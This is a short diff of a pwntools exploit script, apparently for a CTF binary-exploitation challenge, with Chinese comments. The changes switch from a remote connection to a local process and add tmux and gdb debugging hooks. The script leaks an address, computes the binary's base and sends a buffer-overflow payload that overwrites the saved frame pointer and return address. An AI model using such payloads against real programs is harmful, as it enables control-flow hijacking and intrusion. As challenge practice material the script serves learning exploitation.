@@ -1,9 +1,10 @@
 from pwn import *
 import ctypes                              # 
 context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
-#io = process('./pwn')             # 在本地运行程序。
+context.terminal = ["tmux","splitw","-h"]#产生左右分屏，不带的话是上下分屏比较难受
+io = process('./pwn')             # 在本地运行程序。
 # gdb.attach(io)                    # 启动 GDB
-io = connect("127.0.0.1",46731)
+# io = connect("127.0.0.1",46731)
 elf = ELF('./pwn')
 libc = ELF('./libc.so.6')
 
@@ -13,9 +14,9 @@ leak = int(leak,16)
 print(hex(leak))
 elf_base = leak - 0x1060c
 payload = b'a' * 0x20 + p64(elf_base + 0x5000) + p64(elf_base + 0x11EE)
- 
+gdb.attach(io) 
 io.send(payload)
-
+gdb.attach(io) 
 io.recvuntil(b'How can I use ')
 leak = io.recv(14)
 leak = int(leak,16)
